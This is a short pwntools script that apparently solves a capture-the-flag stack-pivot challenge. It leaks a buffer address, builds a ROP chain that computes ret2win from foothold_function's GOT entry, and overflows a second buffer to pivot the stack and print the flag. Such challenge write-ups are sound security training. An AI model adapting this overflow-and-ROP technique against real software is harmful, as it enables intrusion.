"""
rbp-0x08 <= malloc( 0x1000000 )
rbp-0x10 <= buffer[100]

pwnme
rbp-0x28 <= buffer[100]
rbp-0x20 <= input_buf[0x20]
fgets( buffer, 0x100, stdin )
fgets( input_buf, 0x40, stdin )

"""
from pwn import *
#context.log_level = 'debug'
elf = ELF('./pivot')
lib_pivot = ELF('./libpivot.so')
p = process('./pivot')
#p = remote('localhost', 7777 )

p.recvuntil('a place to pivot: 0x')
buf = int( p.recv(12), 16 )
info( "buf :%#x", buf )
offset = abs(lib_pivot.symbols["foothold_function"] - lib_pivot.symbols["ret2win"] )
info( "offset :%#x", offset )

payload = b''
payload += p64( elf.plt["foothold_function"] )
payload += p64( 0x400b00 ) #pop rax
payload += p64( elf.got["foothold_function"] )
payload += p64( 0x400b05 ) #mov rax,Q[rax]
payload += p64( 0x400900 ) #pop rbp
payload += p64( offset )
payload += p64( 0x400b09 ) #add rax,rbp
payload += p64( 0x400b0c ) #ret
payload += p64( 0x4008f5 ) #jmp rax

p.recvuntil('> ')
p.sendline( payload )

payload = b''
payload += b'A'*0x20
payload += b'BBBBBBBB'
payload += p64( 0x400b00 ) #pop rax;ret
payload += p64( buf )
payload += p64( 0x400b02 ) #xchg rsp,rax

p.recvuntil('> ')
p.sendline( payload )

print( p.recv() )
info("flag :%s", p.recvline() )
